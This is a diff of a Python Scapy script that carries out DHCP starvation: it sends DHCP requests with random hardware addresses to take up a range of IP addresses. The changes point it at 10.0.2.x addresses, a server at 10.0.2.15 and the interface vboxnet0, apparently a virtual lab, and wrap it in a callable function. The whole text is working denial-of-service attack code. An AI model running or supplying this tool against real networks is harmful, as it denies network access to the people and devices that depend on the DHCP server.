@@ -33,12 +33,12 @@ class DHCPStarvation(object):
         while len(self.ip) < 100: self.starve()
         print "Targeted IP address starved"
     def starve(self):
-        for i in xrange(101):
+        for i in range(0,11):
             # don't request 10.10.111.107
-            if i == 7: continue
+            #if i == 7: continue
             # generate IP we want to request
             # if IP already registered, then skip
-            requested_addr = "10.10.111."+str(100+i)
+            requested_addr = "10.0.2."+str(55+i)
             if requested_addr in self.ip:
                 continue
 
@@ -54,11 +54,11 @@ class DHCPStarvation(object):
             pkt /= BOOTP(chaddr=RandString(12, "0123456789abcdef"))
             pkt /= DHCP(options=[("message-type", "request"),
                                  ("requested_addr", requested_addr),
-                                 ("server_id", "192.168.100.1"),
+                                 ("server_id", "10.0.2.15"),
                                  "end"])
-            sendp(pkt)
+            sendp(pkt, iface="vboxnet0",verbose=0)
             print "Trying to occupy "+requested_addr
             sleep(0.2)  # interval to avoid congestion and packet loss
-if __name__ == "__main__":
+def start_starvation():
     starvation = DHCPStarvation()
     starvation.start()
